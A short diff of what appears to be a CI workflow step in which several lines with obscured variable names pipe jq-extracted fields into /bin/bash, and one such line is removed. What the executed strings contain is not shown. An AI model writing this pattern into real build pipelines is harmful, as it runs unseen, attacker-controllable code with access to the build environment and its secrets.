@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$m68598" | jq -r .qm953 | /bin/bash
           echo $sg846 | jq -r .zklbu9595 | /bin/bash
           echo $rk051 | jq -r .tb9 | /bin/bash
-          printf '%s' "$bk817" | jq -r .e6 | /bin/bash
           echo $k14280 | jq -r .y7336 | /bin/bash
 
       - name: Store output
